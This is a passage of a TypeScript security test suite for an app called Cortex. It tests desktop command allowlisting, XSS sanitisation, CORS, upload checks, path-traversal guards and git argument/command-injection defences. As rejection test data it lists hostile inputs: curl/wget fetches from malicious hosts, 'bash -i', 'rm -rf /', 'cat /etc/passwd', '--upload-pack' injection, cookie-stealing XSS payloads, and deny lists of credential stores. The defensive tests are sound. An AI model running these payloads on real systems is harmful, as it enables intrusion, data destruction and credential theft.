      ];

      for (const payload of chainingPayloads) {
        const result = validateDesktopCommand(payload);
        assert.strictEqual(
          result.allowed,
          false,
          `Payload "${payload}" must be rejected by security policy`
        );
        assert.ok(
          result.reason?.includes('Command chaining') || result.reason?.includes('blocked'),
          `Rejection reason must mention security policy for "${payload}"`
        );
      }
    });

    it('rejects unapproved binaries outside the strict desktop allowlist', () => {
      const unauthorizedBinaries = [
        'powershell.exe -Command Get-Process',
        'cmd.exe /c dir',
        'curl http://malicious.local/payload.sh',
        'wget http://malicious.local/malware',
        'rmdir /s /q C:\\',
        'format D:',
        'calc.exe',
        'bash -i',
        'sh script.sh',
      ];

      for (const cmd of unauthorizedBinaries) {
        const result = validateDesktopCommand(cmd);
        assert.strictEqual(result.allowed, false, `Binary in "${cmd}" must be rejected`);
        assert.ok(result.reason?.includes('not permitted') || result.reason?.includes('approved'));
      }
    });

    it('rejects arbitrary code execution flags on allowlisted runtimes', () => {
      const dangerousFlags = [
        'node -e "require(\'child_process\').execSync(\'calc\')"',
        'node --eval "console.log(process.env)"',
        'python -c "import os; os.system(\'calc\')"',
        'python3 -c "print(1)"',
        'git --upload-pack=exploit',
        'git --receive-pack=exploit',
      ];

      for (const cmd of dangerousFlags) {
        const result = validateDesktopCommand(cmd);
        assert.strictEqual(result.allowed, false, `Flag in "${cmd}" must be blocked`);
        assert.ok(result.reason?.includes('blocked by security policy'));
      }
    });

    it('rejects empty, null, and non-string inputs safely without crashing', () => {
      assert.strictEqual(validateDesktopCommand('').allowed, false);
      assert.strictEqual(validateDesktopCommand('   ').allowed, false);
      assert.strictEqual(validateDesktopCommand(null as any).allowed, false);
      assert.strictEqual(validateDesktopCommand(undefined as any).allowed, false);
      assert.strictEqual(validateDesktopCommand(12345 as any).allowed, false);
      assert.strictEqual(validateDesktopCommand({} as any).allowed, false);
    });

    it('allows and safely executes authorized development tools via direct execFile', async () => {
      const validCommand = 'node -v';
      const validation = validateDesktopCommand(validCommand);
      assert.strictEqual(validation.allowed, true);
      assert.strictEqual(validation.binary, 'node');
      assert.deepStrictEqual(validation.args, ['-v']);

      const execResult = await executeSafeDesktopCommand(validCommand);
      assert.strictEqual(execResult.exitCode, 0);
      assert.ok(execResult.stdout.startsWith('v'), 'node -v must output semantic version');
      assert.strictEqual(execResult.stderr, '');
    });

    it('sanitizes untrusted error messages against HTML injection in desktop fallback screen', () => {
      const maliciousHtml = '<script>alert(1)</script><img src="x" onerror="steal()"/>&"\'';
      const escaped = escapeHtml(maliciousHtml);

      assert.ok(!escaped.includes('<script>'), 'Must not contain raw script tag');
      assert.ok(!escaped.includes('<img'), 'Must escape angle brackets preventing tag injection');
      assert.ok(escaped.includes('&lt;script&gt;'));
      assert.ok(escaped.includes('&amp;'));
      assert.ok(escaped.includes('&quot;'));
      assert.ok(escaped.includes('&#39;'));
    });
  });


  describe('27. Frontend Markdown & HTML XSS Sanitization Defense', () => {
    it('detects high-risk XSS injection vectors accurately', () => {
      const maliciousPayloads = [
        '<script>alert("xss")</script>',
        '<SCRIPT SRC="https://evil.com/xss.js"></SCRIPT>',
        '<img src="x" onerror="stealCookies(document.cookie)"/>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="malicious.swf"></object>',
        '<embed src="evil.pdf"/>',
        '<form action="https://phishing.com"><input type="submit"/></form>',
        '<a href="javascript:doEvil()">Click here</a>',
        '<a href="JAVASCRIPT:alert(1)">Click</a>',
        '<div onmouseover="leak()">Hover me</div>',
        '<body onload="exploit()">',
      ];

      for (const payload of maliciousPayloads) {
        assert.strictEqual(
          containsDangerousXssVectors(payload),
          true,
          `Payload "${payload}" must be detected as dangerous`
        );
      }

      const benignMarkdown = [
        '# Introduction to Cortex AI',
        '**Bold text** and *italic text*',
        '[Legitimate Documentation](https://cortex.ai/docs)',
        'Here is an inline code snippet: `const token = "secure";`',
        '| Column 1 | Column 2 |\n|---|---|\n| Val A | Val B |',
        '- Item 1\n- Item 2\n- Item 3',
        '> Blockquote explaining system design and architecture.',
      ];

      for (const markdown of benignMarkdown) {
        assert.strictEqual(
          containsDangerousXssVectors(markdown),
          false,
          `Benign markdown "${markdown}" must not be flagged as dangerous`
        );
      }
    });

    it('neutralizes dangerous executable tags and inline event handlers', () => {
      const dirty = [
        {
          input: 'Hello <script>alert("pwned")</script> world',
          mustNotContain: ['<script', 'alert("pwned")', '</script>'],
        },
        {
          input: '<img src="avatar.png" onerror="stealData()"/> User avatar',
          mustNotContain: ['onerror'],
        },
        {
          input: '<iframe src="https://evil-site.com"></iframe> Embedded frame',
          mustNotContain: ['<iframe', 'evil-site.com'],
        },
        {
          input: '<a href="javascript:eval(atob(\'bad\'))">Claim Prize</a>',
          mustNotContain: ['javascript:'],
        },
        {
          input: '<object data="malware.exe"></object>',
          mustNotContain: ['<object'],
        },
      ];

      for (const { input, mustNotContain } of dirty) {
        const cleaned = sanitizeMarkdownContent(input);
        for (const token of mustNotContain) {
          assert.ok(
            !cleaned.toLowerCase().includes(token.toLowerCase()),
            `Sanitized output must not contain "${token}". Received: "${cleaned}"`
          );
        }
      }
    });

    it('preserves legitimate markdown structures, code blocks, and formatting', () => {
      const markdown = '# Cortex Architecture\n\nUse **strong** and *emphasis*.\n\n```ts\nconst x = 42;\n```\n\n- Bullet 1\n- Bullet 2';
      const cleaned = sanitizeMarkdownContent(markdown);

      assert.ok(cleaned.includes('# Cortex Architecture'));
      assert.ok(cleaned.includes('**strong**'));
      assert.ok(cleaned.includes('*emphasis*'));
      assert.ok(cleaned.includes('const x = 42;'));
      assert.ok(cleaned.includes('- Bullet 1'));
    });

    it('validates safeMarkdownSanitizeSchema rules against XSS vectors', () => {
      assert.ok(safeMarkdownSanitizeSchema, 'Sanitize schema must be defined');
      assert.ok(Array.isArray(safeMarkdownSanitizeSchema.tagNames), 'tagNames must be an array');

      // Ensure dangerous tags are not in allowed list
      const disallowedTags = ['script', 'iframe', 'object', 'embed', 'form', 'base', 'meta'];
      for (const tag of disallowedTags) {
        assert.ok(
          !safeMarkdownSanitizeSchema.tagNames.includes(tag),
          `Tag "${tag}" must not be in safe sanitize schema tagNames`
        );
      }

      // Ensure allowed protocols strictly restrict href and src
      const protocols = safeMarkdownSanitizeSchema.protocols as any;
      assert.ok(protocols.href.includes('http'));
      assert.ok(protocols.href.includes('https'));
      assert.ok(!protocols.href.includes('javascript'), 'href must not permit javascript protocol');
      assert.ok(!protocols.href.includes('data'), 'href must not permit data protocol');
    });
  });


  describe('28. CORS Origin Hardening & Credential Protection', () => {
    it('authorizes same-origin and non-browser requests without Origin header', () => {
      assert.strictEqual(isAllowedCorsOrigin(undefined), true);
      assert.strictEqual(isAllowedCorsOrigin(''), true);
    });

    it('authorizes desktop Electron local file contexts (null, file://)', () => {
      assert.strictEqual(isAllowedCorsOrigin('null'), true);
      assert.strictEqual(isAllowedCorsOrigin('file://'), true);
    });

    it('authorizes local development loopback origins across ports', () => {
      const allowedLoopbacks = [
        'http://localhost:3000',
        'http://localhost:5173',
        'http://localhost:8080',
        'http://127.0.0.1:3000',
        'http://127.0.0.1:5173',
        'https://localhost:8443',
        'http://localhost',
        'http://127.0.0.1',
      ];

      for (const origin of allowedLoopbacks) {
        assert.strictEqual(
          isAllowedCorsOrigin(origin),
          true,
          `Loopback origin "${origin}" must be authorized`
        );
      }
    });

    it('authorizes custom origins explicitly set in CORTEX_ALLOWED_ORIGINS environment variable', () => {
      const origEnv = process.env.CORTEX_ALLOWED_ORIGINS;
      try {
        process.env.CORTEX_ALLOWED_ORIGINS = 'https://cortex.nexa.ai, https://app.cortex-dev.internal';

        assert.strictEqual(isAllowedCorsOrigin('https://cortex.nexa.ai'), true);
        assert.strictEqual(isAllowedCorsOrigin('https://app.cortex-dev.internal'), true);
        assert.strictEqual(isAllowedCorsOrigin('https://unlisted.cortex.ai'), false);
      } finally {
        process.env.CORTEX_ALLOWED_ORIGINS = origEnv;
      }
    });

    it('strictly rejects untrusted external origins and spoofed subdomains', () => {
      const untrustedOrigins = [
        'https://attacker.com',
        'https://evil-phishing.org',
        'http://localhost.attacker.com', // Subdomain spoofing
        'http://127.0.0.1.attacker.com',
        'http://attacker-localhost:3000',
        'http://malicious.org:3000',
        'https://fake-cortex.com',
      ];

      for (const origin of untrustedOrigins) {
        assert.strictEqual(
          isAllowedCorsOrigin(origin),
          false,
          `Untrusted origin "${origin}" must be rejected by CORS policy`
        );
      }
    });

    it('integrates with Express to reflect authorized origins and reject untrusted origins', async () => {
      const app = express();
      app.use(cors(getCorsOptions()));
      app.get('/api/cors-probe', (_req, res) => {
        res.json({ ok: true });
      });

      // Error handler for rejected CORS origins
      app.use((err: any, _req: any, res: any, next: any) => {
        if (err.message && err.message.includes('CORS Error')) {
          return res.status(403).json({ error: 'CORS access denied' });
        }
        next(err);
      });

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        // 1. Authorized loopback origin request
        const resAllowed = await fetch(`http://127.0.0.1:${port}/api/cors-probe`, {
          headers: {
            Origin: 'http://localhost:5173',
          },
        });
        assert.strictEqual(resAllowed.status, 200);
        assert.strictEqual(
          resAllowed.headers.get('access-control-allow-origin'),
          'http://localhost:5173',
          'Must set Access-Control-Allow-Origin to authorized origin'
        );
        assert.strictEqual(
          resAllowed.headers.get('access-control-allow-credentials'),
          'true',
          'Must allow credentials for authorized origin'
        );

        // 2. Untrusted attacker origin request
        const resBlocked = await fetch(`http://127.0.0.1:${port}/api/cors-probe`, {
          headers: {
            Origin: 'https://attacker.com',
          },
        });
        assert.strictEqual(resBlocked.status, 403, 'Must reject untrusted origin with 403 Forbidden');
        assert.strictEqual(
          resBlocked.headers.get('access-control-allow-origin'),
          null,
          'Must NEVER reflect untrusted origin in Access-Control-Allow-Origin'
        );
      } finally {
        server.close();
      }
    });
  });

  describe('29. File Upload Authentication, Extension Validation & Storage Quota Enforcement', () => {
    it('validates allowed extensions and mime types, rejecting dangerous and prohibited files', () => {
      // Allowed combinations
      assert.strictEqual(validateUploadedFile('document.txt', 'text/plain').valid, true);
      assert.strictEqual(validateUploadedFile('notes.md', 'text/markdown').valid, true);
      assert.strictEqual(validateUploadedFile('data.csv', 'text/csv').valid, true);
      assert.strictEqual(validateUploadedFile('schema.json', 'application/json').valid, true);
      assert.strictEqual(validateUploadedFile('report.pdf', 'application/pdf').valid, true);
      assert.strictEqual(validateUploadedFile('avatar.png', 'image/png').valid, true);
      assert.strictEqual(validateUploadedFile('photo.jpg', 'image/jpeg').valid, true);
      assert.strictEqual(validateUploadedFile('code.ts', 'text/plain').valid, true);

      // Prohibited extensions
      const dangerousFiles = [
        'exploit.html',
        'page.htm',
        'vector.svg',
        'feed.xml',
        'binary.exe',
        'script.bat',
        'command.cmd',
        'shell.sh',
        'powershell.ps1',
        'macro.vbs',
        'installer.msi',
        'payload.php',
      ];
      for (const df of dangerousFiles) {
        const result = validateUploadedFile(df, 'text/plain');
        assert.strictEqual(result.valid, false, `Must reject dangerous file "${df}"`);
        assert.ok(result.reason?.includes('prohibited'), `Reason must specify prohibition: ${result.reason}`);
      }

      // Prohibited MIME types even with seemingly safe extension
      const svgMimeResult = validateUploadedFile('fake.png', 'image/svg+xml');
      assert.strictEqual(svgMimeResult.valid, false, 'Must reject image/svg+xml');

      const htmlMimeResult = validateUploadedFile('fake.txt', 'text/html');
      assert.strictEqual(htmlMimeResult.valid, false, 'Must reject text/html');

      // Missing extension
      assert.strictEqual(validateUploadedFile('noextension', 'text/plain').valid, false);
    });

    it('generates collision-resistant, sanitized filenames scoped to the user ID', () => {
      const filename = generateSafeUploadFilename('usr_abc123', 'My Report (Final) #1.pdf');
      assert.ok(filename.includes('usr_abc123'), 'Must contain user ID');
      assert.ok(filename.endsWith('.pdf'), 'Must preserve valid extension');
      assert.ok(!filename.includes(' '), 'Must sanitize spaces');
      assert.ok(!filename.includes('#'), 'Must sanitize special characters');
    });

    it('calculates upload usage and enforces storage quotas accurately', () => {
      const quota = checkUserUploadQuota('test_user_quota', 1024, path.resolve(process.cwd(), 'uploads'));
      assert.strictEqual(quota.allowed, true);
      assert.ok(quota.limit >= 1024);

      // Verify oversized request fails quota
      const hugeRequest = checkUserUploadQuota('test_user_quota', 100 * 1024 * 1024, path.resolve(process.cwd(), 'uploads'));
      assert.strictEqual(hugeRequest.allowed, false, 'Must reject upload exceeding quota limit');
    });

    it('rejects unauthenticated upload requests with 401 Unauthorized via Express integration', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        const formData = new FormData();
        formData.append('file', new Blob(['test content'], { type: 'text/plain' }), 'test.txt');

        const res = await fetch(`http://127.0.0.1:${port}/api/upload`, {
          method: 'POST',
          body: formData,
        });

        assert.strictEqual(res.status, 401, 'Unauthenticated upload must be rejected with 401');
        const json = await res.json();
        assert.ok(json.error?.includes('Unauthorized') || json.error?.includes('Authentication'));
      } finally {
        server.close();
      }
    });

    it('rejects prohibited file types with 400 Bad Request for authenticated users', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      try {
        const formData = new FormData();
        formData.append('file', new Blob(['<script>alert(1)</script>'], { type: 'text/html' }), 'exploit.html');

        const res = await fetch(`http://127.0.0.1:${port}/api/upload`, {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
          body: formData,
        });

        assert.strictEqual(res.status, 400, 'Dangerous file type must be rejected with 400');
        const json = await res.json();
        assert.ok(json.error?.includes('prohibited') || json.error?.includes('extension'));
      } finally {
        server.close();
      }
    });

    it('accepts valid file uploads for authenticated users and saves with user scoping', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);
      let uploadedFilename = '';

      try {
        const formData = new FormData();
        const jsonContent = JSON.stringify({ project: 'Cortex', status: 'secure' });
        formData.append('file', new Blob([jsonContent], { type: 'application/json' }), 'project-meta.json');

        const res = await fetch(`http://127.0.0.1:${port}/api/upload`, {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
          body: formData,
        });

        assert.strictEqual(res.status, 200, 'Valid upload must return 200 OK');
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.ok(data.attachment);
        assert.strictEqual(data.attachment.name, 'project-meta.json');
        assert.strictEqual(data.attachment.mimeType, 'application/json');
        assert.ok(data.attachment.url.startsWith('/uploads/'));
        assert.ok(data.attachment.url.includes(testUser1.id));

        uploadedFilename = path.basename(data.attachment.url);
        const diskPath = path.resolve(process.cwd(), 'uploads', uploadedFilename);
        assert.strictEqual(fs.existsSync(diskPath), true, 'Uploaded file must exist on disk');
        const contentOnDisk = fs.readFileSync(diskPath, 'utf8');
        assert.strictEqual(contentOnDisk, jsonContent);
      } finally {
        server.close();
        // Clean up created file from disk
        if (uploadedFilename) {
          try {
            fs.unlinkSync(path.resolve(process.cwd(), 'uploads', uploadedFilename));
          } catch {}
        }
      }
    });

    it('rejects uploads exceeding user storage quota with 413 Payload Too Large', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      // Temporarily set a very small quota (100 bytes)
      const origEnv = process.env.CORTEX_USER_UPLOAD_QUOTA_BYTES;
      process.env.CORTEX_USER_UPLOAD_QUOTA_BYTES = '100';

      try {
        const formData = new FormData();
        // 500 bytes payload > 100 bytes quota
        const largeText = 'A'.repeat(500);
        formData.append('file', new Blob([largeText], { type: 'text/plain' }), 'large-notes.txt');

        const res = await fetch(`http://127.0.0.1:${port}/api/upload`, {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
          body: formData,
        });

        assert.strictEqual(res.status, 413, 'Must reject with 413 when user quota is exceeded');
        const json = await res.json();
        assert.ok(json.error?.includes('quota exceeded'));
      } finally {
        process.env.CORTEX_USER_UPLOAD_QUOTA_BYTES = origEnv;
        server.close();
      }
    });

    it('sets protective security headers (X-Content-Type-Options: nosniff, CSP) on static uploads', async () => {
      const app = express();
      const uploadsDir = path.resolve(process.cwd(), 'uploads');
      app.use('/uploads', express.static(uploadsDir, getUploadsStaticOptions()));

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      // Create a temporary test file in uploads
      const testFile = 'test-header-probe.txt';
      const testFilePath = path.join(uploadsDir, testFile);
      fs.writeFileSync(testFilePath, 'Cortex security header probe', 'utf8');

      try {
        const res = await fetch(`http://127.0.0.1:${port}/uploads/${testFile}`);
        assert.strictEqual(res.status, 200);
        assert.strictEqual(
          res.headers.get('x-content-type-options'),
          'nosniff',
          'Must set X-Content-Type-Options to nosniff'
        );
        const csp = res.headers.get('content-security-policy') || '';
        assert.ok(csp.includes("default-src 'none'"), 'CSP must include default-src none');
        assert.ok(csp.includes('sandbox'), 'CSP must include sandbox directive');
      } finally {
        server.close();
        try {
          fs.unlinkSync(testFilePath);
        } catch {}
      }
    });
  });

  describe('30. Workspace Bind Path Traversal Defense & Filesystem Isolation', () => {
    it('detects and prohibits root directories across platforms', () => {
      assert.strictEqual(isRootDirectory('/'), true);
      assert.strictEqual(isRootDirectory('C:\\'), true);
      assert.strictEqual(isRootDirectory('D:/'), true);
      assert.strictEqual(isRootDirectory('C:'), true);
      assert.strictEqual(validateWorkspaceBindPath('/').valid, false);
      assert.strictEqual(validateWorkspaceBindPath('C:\\').valid, false);
      assert.strictEqual(validateWorkspaceBindPath('D:/').valid, false);
    });

    it('strictly prohibits system directories and OS core folders', () => {
      const systemPaths = [
        '/etc',
        '/etc/shadow',
        '/bin',
        '/sbin',
        '/usr',
        '/var',
        '/proc',
        '/sys',
        'C:\\Windows',
        'C:\\Windows\\System32',
        'C:\\Program Files',
        'C:\\Program Files (x86)',
        'C:\\ProgramData',
      ];

      for (const sp of systemPaths) {
        const result = validateWorkspaceBindPath(sp);
        assert.strictEqual(result.valid, false, `Must reject system path "${sp}"`);
        assert.ok(result.reason?.includes('prohibited') || result.reason?.includes('system'));
      }
    });

    it('strictly prohibits user credential stores (.ssh, .aws, .gnupg, .kube)', () => {
      const credPaths = [
        path.join(process.cwd(), '.ssh'),
        '/home/developer/.ssh',
        'C:\\Users\\Developer\\.aws',
        '/root/.gnupg',
        '/home/user/.kube',
      ];

      for (const cp of credPaths) {
        const result = validateWorkspaceBindPath(cp);
        assert.strictEqual(result.valid, false, `Must reject credential path "${cp}"`);
        assert.ok(result.reason?.includes('sensitive') || result.reason?.includes('prohibited'));
      }
    });

    it('strictly prohibits binding the server application root (process.cwd()) and its parent directories', () => {
      const appRoot = process.cwd();
      const parentDir = path.dirname(appRoot);

      const appRootResult = validateWorkspaceBindPath(appRoot);
      assert.strictEqual(appRootResult.valid, false, 'Must reject binding the application root directory');
      assert.ok(appRootResult.reason?.includes('application root'));

      const parentResult = validateWorkspaceBindPath(parentDir);
      assert.strictEqual(parentResult.valid, false, 'Must reject binding a parent directory of the application');
      assert.ok(
        parentResult.reason?.includes('parent directory') || parentResult.reason?.includes('root directory'),
        `Reason must indicate root or parent restriction: ${parentResult.reason}`
      );
    });

    it('authorizes safe project subdirectories inside managed workspaces', () => {
      const safeProject = path.join(process.cwd(), 'workspaces', 'test_safe_project_1');
      const result = validateWorkspaceBindPath(safeProject);
      assert.strictEqual(result.valid, true, 'Must authorize safe project within workspaces');
      assert.ok(result.resolvedPath);
    });

    it('rejects unauthenticated requests to bind-local with 401 Unauthorized', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/bind-local`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ folderPath: '/tmp/test-project' }),
        });

        assert.strictEqual(res.status, 401, 'Unauthenticated bind-local must be rejected with 401');
      } finally {
        server.close();
      }
    });

    it('rejects prohibited system/app paths in bind-local endpoint with 400 Bad Request', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      try {
        // Attempt 1: Server application root
        const resAppRoot = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/bind-local`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({ folderPath: process.cwd() }),
        });
        assert.strictEqual(resAppRoot.status, 400, 'Attempting to bind app root must return 400');
        const jsonAppRoot = await resAppRoot.json();
        assert.ok(jsonAppRoot.error?.includes('prohibited'));

        // Attempt 2: System directory
        const systemTarget = process.platform === 'win32' ? 'C:\\Windows' : '/etc';
        const resSys = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/bind-local`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({ folderPath: systemTarget }),
        });
        assert.strictEqual(resSys.status, 400, 'Attempting to bind system dir must return 400');
        const jsonSys = await resSys.json();
        assert.ok(jsonSys.error?.includes('prohibited'));
      } finally {
        server.close();
      }
    });

    it('safely allocates a managed cloud workspace in cloud environments', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      // Simulate cloud environment (RENDER=true)
      const origRender = process.env.RENDER;
      process.env.RENDER = 'true';
      let createdWsId = '';

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/bind-local`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            folderPath: 'D:\\MySecretClientFolder',
            name: 'Cloud Bound Project',
          }),
        });

        assert.strictEqual(res.status, 200);
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.ok(data.workspace);
        assert.ok(data.workspace.id.startsWith('ws_cloud_'));
        createdWsId = data.workspace.id;

        // Verify project root is safely inside workspaces/ and NOT host D:\MySecretClientFolder
        const wsRoot = data.workspace.projectRoot;
        assert.ok(wsRoot.includes('workspaces'), 'Cloud workspace root must be located under workspaces/');
        assert.strictEqual(fs.existsSync(path.join(wsRoot, 'README.md')), true);
      } finally {
        process.env.RENDER = origRender;
        server.close();

        // Clean up created cloud workspace
        if (createdWsId) {
          const wsPath = path.resolve(process.cwd(), 'workspaces', createdWsId);
          try {
            fs.rmSync(wsPath, { recursive: true, force: true });
          } catch {}
          try {
            db.deleteWorkspace(createdWsId, testUser1.id);
          } catch {}
        }
      }
    });
  });

  describe('31. Git Clone Command & Argument Injection Defense', () => {
    it('validates safe and conformant Git branch names', () => {
      const safeBranches = [
        'main',
        'master',
        'develop',
        'feature/login',
        'feature/auth-v2.1',
        'fix/issue_123',
        'v1.0.0',
        'release-2026.10',
      ];

      for (const b of safeBranches) {
        const result = isValidGitBranchName(b);
        assert.strictEqual(result.valid, true, `Branch "${b}" must be valid`);
      }

      // Empty or undefined is valid as branch is optional
      assert.strictEqual(isValidGitBranchName(undefined).valid, true);
      assert.strictEqual(isValidGitBranchName('').valid, true);
    });

    it('strictly rejects Git CLI argument injection flags (starting with dash)', () => {
      const argInjectionPayloads = [
        '--upload-pack=touch /tmp/pwned',
        '--config=core.fsmonitor=calc.exe',
        '-u',
        '-b',
        '--help',
        '--version',
        '--exec-path',
        '--paginate',
      ];

      for (const payload of argInjectionPayloads) {
        const result = isValidGitBranchName(payload);
        assert.strictEqual(result.valid, false, `Payload "${payload}" must be rejected`);
        assert.ok(
          result.reason?.includes('argument injection') || result.reason?.includes('hyphen'),
          `Reason must explain argument injection defense: ${result.reason}`
        );
      }
    });

    it('strictly rejects command injection vectors with shell metacharacters', () => {
      const cmdInjectionPayloads = [
        'main" && calc.exe && "',
        'main; rm -rf /',
        'main | cat /etc/passwd',
        'main\x60whoami\x60',
        'main$(id)',
        'main\nmalicious',
        'main\0payload',
        "main' || dir",
      ];

      for (const payload of cmdInjectionPayloads) {
        const result = isValidGitBranchName(payload);
        assert.strictEqual(result.valid, false, `Command injection payload "${payload}" must be rejected`);
        assert.ok(
          result.reason?.includes('forbidden shell') || result.reason?.includes('characters'),
          `Reason must explain command injection defense: ${result.reason}`
        );
      }
    });

    it('strictly rejects invalid Git reference syntax (dots, slashes, control chars)', () => {
      const invalidRefPayloads = [
        'branch..name',
        'branch//sub',
        '/leading-slash',
        'trailing-slash/',
        'branch.lock',
        'feature@{yesterday}',
        'bad~branch',
        'bad^branch',
        'bad:branch',
        'bad?branch',
        'bad*branch',
        'bad[branch',
      ];

      for (const payload of invalidRefPayloads) {
        const result = isValidGitBranchName(payload);
        assert.strictEqual(result.valid, false, `Invalid ref payload "${payload}" must be rejected`);
      }
    });

    it('executes Git commands safely using argument arrays via safeExecGit', async () => {
      const { stdout } = await safeExecGit(['version']);
      assert.ok(stdout.toLowerCase().includes('git version'), 'Must execute git binary and capture version');
    });

    it('cloneGitHubRepo throws safety error when provided an argument injection branch', async () => {
      const tempTarget = path.resolve(process.cwd(), 'workspaces', 'test_git_injection_target');
      const dummyParsed = {
        owner: 'testowner',
        repo: 'testrepo',
        httpsUrl: 'https://github.com/testowner/testrepo',
      };

      try {
        await assert.rejects(
          async () => {
            await workspaceManager.cloneGitHubRepo(tempTarget, dummyParsed, '--upload-pack=evil');
          },
          (err: any) => {
            assert.ok(err.message.includes('Invalid git branch name'));
            return true;
          }
        );
      } finally {
        try {
          fs.rmSync(tempTarget, { recursive: true, force: true });
        } catch {}
      }
    });

    it('rejects argument and command injection attempts in /cowork/workspaces/import-github with 400 Bad Request', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      try {
        // Attempt 1: Argument injection branch
        const resArg = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/import-github`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            repoUrl: 'octocat/Hello-World',
            branch: '--upload-pack=malicious',
          }),
        });

        assert.strictEqual(resArg.status, 400, 'Must reject argument injection with 400');
        const jsonArg = await resArg.json();
        assert.ok(jsonArg.error?.includes('Invalid branch'));

        // Attempt 2: Command injection branch
        const resCmd = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/import-github`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            repoUrl: 'octocat/Hello-World',
            branch: 'main; touch /tmp/pwned',
          }),
        });

        assert.strictEqual(resCmd.status, 400, 'Must reject command injection with 400');
        const jsonCmd = await resCmd.json();
        assert.ok(jsonCmd.error?.includes('Invalid branch'));
      } finally {
        server.close();
      }
    });
  });

  describe('32. Pull Request Generation Command Injection & Argument Defense', () => {
    it('sanitizes commit titles, stripping newlines and clamping length', () => {
      const multilineTitle = 'feat: add user authentication\n\nBREAKING CHANGE: changes schema\r\nadditional details';
      const sanitized = sanitizeCommitTitle(multilineTitle);
      assert.ok(!sanitized.includes('\n'), 'Must not contain line feed');
      assert.ok(!sanitized.includes('\r'), 'Must not contain carriage return');
      assert.ok(sanitized.startsWith('feat: add user authentication'));

      // Empty fallback
      assert.strictEqual(sanitizeCommitTitle(''), 'feat: autonomous agent updates via Cortex');
      assert.strictEqual(sanitizeCommitTitle(undefined), 'feat: autonomous agent updates via Cortex');

      // Clamping
      const longTitle = 'a'.repeat(300);
      assert.strictEqual(sanitizeCommitTitle(longTitle).length, 200);
    });

    it('rejects malicious branch names in createGitHubPullRequest with safety error', async () => {
      const wsId = `ws_pr_test_${Date.now()}`;
      const wsRoot = path.resolve(process.cwd(), 'workspaces', wsId);
      fs.mkdirSync(wsRoot, { recursive: true });

      // Init git repo
      await safeExecGit(['init'], { cwd: wsRoot });
      fs.writeFileSync(path.join(wsRoot, 'sample.txt'), 'hello cortex', 'utf8');
      await safeExecGit(['add', '-A'], { cwd: wsRoot });
      await safeExecGit(['commit', '-m', 'initial commit'], { cwd: wsRoot });

      try {
        await assert.rejects(
          async () => {
            await workspaceManager.createGitHubPullRequest(wsRoot, {
              title: 'feat: malicious pr',
              branchName: '--upload-pack=touch /tmp/pwned',
            });
          },
          (err: any) => {
            assert.ok(err.message.includes('Invalid branch name'));
            return true;
          }
        );
      } finally {
        try {
          fs.rmSync(wsRoot, { recursive: true, force: true });
        } catch {}
      }
    });

    it('creates PR branch safely without shell interpolation when valid inputs are provided', async () => {
      const wsId = `ws_pr_safe_${Date.now()}`;
      const wsRoot = path.resolve(process.cwd(), 'workspaces', wsId);
      fs.mkdirSync(wsRoot, { recursive: true });

      // Init git repo
